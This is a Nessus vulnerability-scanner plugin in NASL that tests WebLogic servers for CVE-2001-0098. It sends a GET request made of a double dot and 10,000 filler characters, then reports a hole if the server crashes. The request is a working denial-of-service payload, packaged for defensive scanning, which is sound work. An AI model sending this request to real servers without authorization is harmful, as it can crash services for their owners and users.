#
# This script was written by Vincent Renardias <vincent@strongholdnet.com>
#
# Licence : GPL v2
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (4/13/2009)


include("compat.inc");

if(description)
{
 script_id(10697);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2001-0098");
 script_bugtraq_id(2138);
 script_xref(name:"OSVDB", value:"10067");

 script_name(english:"WebLogic Server Double Dot GET Request Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"Requesting an overly long URL starting with a double dot can crash
certain versions of WebLogic servers or possibly even allow for
arbitrary code execution." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-12/0331.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WebLogic 5.1 with Service Pack 7 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();

 
 script_summary(english:"WebLogic Server DoS");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2001-2009 StrongHoldNet");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if (!banner || "WebLogic" >!< banner) exit(0);

if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 soc = http_open_socket(port);
 if(soc)
 {
  buffer = http_get(item:string("..", crap(10000)), port:port);
  send(socket:soc, data:buffer);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port, retry: 2))security_hole(port);
 }
}

